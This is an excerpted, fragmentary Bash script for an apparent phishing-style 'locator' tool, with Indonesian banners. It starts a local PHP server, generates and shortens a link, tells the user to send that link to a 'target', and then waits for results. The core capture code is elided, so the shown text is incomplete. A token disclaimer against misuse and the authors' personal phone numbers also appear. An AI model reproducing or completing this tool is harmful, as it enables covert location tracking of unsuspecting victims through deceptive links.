...
##
serverx() {
printf "\e[1;92m[\e[0m*\e[1;92m] Sedang memulai Server Php...\n"
php -t "server/" -S 127.0.0.1:$port > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Memulai Server,Mohon Tunggu...\e[0m\n"
...
printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Kirim Link Ini Ke Target Yang Mau Lu tuju:\e[0m\e[1;77m %s \n' $send_link
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Url Cadangan:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
checkfound
...
printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Pilih Port (Standard Cuk:\e[0m\e[1;77m 55333 \e[0m\e[1;92m): \e[0m' $default_port
read port
...
printf "\e[1;92m[\e[0m*\e[1;92m] Lagi Download Nih Bangsat :v...\n"
...
printf "\e[1;92m[\e[0m*\e[1;92m] Kirim Link Ini Ke Target Yang Mau Lu Tuju!!:\e[0m\e[1;77m %s\e[0m\n" $link
checkfound
}
...
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Pilih Mau Nomer Berapa!!: \e[0m\en' option_server
...
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Mohon Tunggu ...\e[0m\n"
while [ true ]; do
...
printf "\e[1;93m <<<============================================================>>> \e[0m\n" |lolcat
printf "\e[1;93m    ATHOR : FROZEN FLAMES                                           \e[0m\n" |lolcat
printf "\e[1;93m    BROTHER : Mr.Xtria                                              \e[0m\n" |lolcat
printf "\e[1;93m    Tim : WHITE HAT IND & INTELEGENT CYBER ARMY                     \e[0m\n" |lolcat
printf "\e[1;93m    WhatsApp : 085275097993 & 082165815166 Sve Kalau Perlu          \e[0m\n" |lolcat
printf "\e[1;93m <<<============================================================>>> \e[0m\n" |lolcat

printf "\e[1;93m  TOOLS BY FROZEN FLAMES TAMPAN :v         \e[0m\n"  |lolcat



printf "\e[1;93m halo Gays Kembali Lagi Bersama Saya Frozen flames \e[0m\n" |lolcat
printf "\e[1;93m Di Sini Frozen Flames Membuat Tools Locator Ya Coeg \e[0m\n" |lolcat
printf "\e[1;93m Gunakan Tools Dengan Baik.. Jangan Untuk Kejahatan!! \e[0m\n" |lolcat
printf "\e[1;93m Gua Yakin Lu Pada Bisa Melakukan Tools Gua Dengan Bijak!! \e[0m\n" |lolcat
printf "\e[1;93m Oke Langsung Aja Lu Pakai tools Gua..\e[0m\n"  |lolcat 
printf "\e[1;93m Dan Terima Kasih Buat Kalian Yang Memakai Tools Gua Dengan Bijak:) \e[0m\n"  |lolcat
...
printf "\n"
printf "\e[1;93m :::\e[0m\e[1;77m Coded by: FROZEN FLAMES\e[0m\n"
printf "\e[1;93m  Solat 5 Waktu Itu Yang Terpenting :) \e[0m\n" |lolcat
